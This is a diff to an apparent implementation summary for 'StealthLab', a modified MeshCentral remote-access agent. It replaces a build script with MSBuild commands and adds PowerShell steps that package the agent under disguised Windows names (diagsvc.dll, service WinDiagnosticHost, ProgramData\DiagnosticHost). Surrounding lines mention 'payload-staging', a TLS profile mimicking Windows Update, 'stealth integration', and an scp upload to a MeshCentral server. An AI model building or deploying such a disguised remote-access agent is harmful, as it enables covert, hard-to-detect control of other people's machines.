@@ -104,7 +104,8 @@ IMPLEMENTATION_SUMMARY.md                - This file
 ```
 .gitignore                               - Added sensitive file patterns
 branding_config.json                     - Updated to realistic Windows names
-build.ps1                                - Auto-generate network profiles
+MeshAgent.Build.proj                     - Direct MSBuild entrypoint for StealthLab builds
+meshservice/MeshAgent.MSBuild.targets    - Shared asset-generation and payload-staging targets
 meshservice/ServiceMain.c                - Buffer fix + stealth integration
 tools/generate_network_profile.py        - Fixed Unicode encoding
 ```
@@ -119,8 +120,8 @@ tools/generate_network_profile.py        - Fixed Unicode encoding
 # Optional: override TLS profile (defaults to windows_update)
 $env:TLS_PROFILE = "windows_update"
 
-# Build StealthLab payloads and binaries (default behaviour)
-.\build.ps1
+# Build StealthLab payloads and binaries
+MSBuild.exe .\MeshAgent.Build.proj /m /nologo /verbosity:minimal
 
 # Manual Release regression (creates Release\MeshService64.exe + meshservice\Release\MeshService.exe)
 $msbuild = "${env:ProgramFiles}\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe"
@@ -135,8 +136,13 @@ pwsh .\test.ps1 -ReportPath .\dist\verify-report.json
 # Optional: requires Release outputs; expect warnings if binaries are unsigned
 pwsh .\test_comprehensive.ps1
 
-# Package + health probe (adds dist\MeshAgent_Stealth_<stamp>\)
-.\build_complete.ps1 -RunHealthCheck -SkipArchive
+# Package from the built outputs and then run the health probe if needed
+$bundle = Join-Path 'dist' ("MeshAgent_Stealth_{0}" -f (Get-Date -Format 'yyyyMMdd_HHmmss'))
+New-Item -ItemType Directory -Path $bundle -Force | Out-Null
+Copy-Item 'meshservice\x64\StealthLab\MeshService-2022.exe' (Join-Path $bundle 'MeshService64.exe') -Force
+Copy-Item 'meshservice\StealthLab\MeshService-2022.exe' (Join-Path $bundle 'MeshService.exe') -Force
+Copy-Item 'meshservice\x64\StealthLab_DLL\MeshService-2022.dll' (Join-Path $bundle 'diagsvc.dll') -Force
+pwsh .\tools\health_check.ps1 -ServiceName WinDiagnosticHost -ReportPath (Join-Path $bundle 'health_report.json')
 ```
 
 > Supply `-HealthCheckArgs @{ InstallPath = 'C:\\ProgramData\\DiagnosticHost' }` when you need an all-green health report; without it the probe records a warning and a failure for the missing installed binary.
@@ -145,10 +151,7 @@ pwsh .\test_comprehensive.ps1
 
 ```powershell
 # Transfer-ready deliverable (hashes, metadata, ZIP)
-pwsh .\tools\create_release_package.ps1   # or use the snippet in DEPLOYMENT_GUIDE.md
-
-# MeshCentral override bundle
-.\tools\prepare_meshcentral_agent.ps1
+# Use the explicit staging snippet in DEPLOYMENT_GUIDE.md
 
 # Upload diagsvc.dll and companion executables
 scp dist\MeshAgent_Stealth_*\diagsvc.dll root@server:/opt/meshcentral/meshcentral-data/agents-custom/meshagent_win32_x64.exe
@@ -309,7 +312,7 @@ Verification:
 
 ```powershell
 # Build with security features
-.\build.ps1
+MSBuild.exe .\MeshAgent.Build.proj /m /nologo /verbosity:minimal
 
 # Verify security configuration
 .\tools\verify_deployment.ps1
@@ -436,7 +439,7 @@ From original audit (all CRITICAL items addressed):
 
 ```powershell
 # 1. Build
-.\build.ps1
+MSBuild.exe .\MeshAgent.Build.proj /m /nologo /verbosity:minimal
 
 # 2. Verify
 .\tools\verify_deployment.ps1
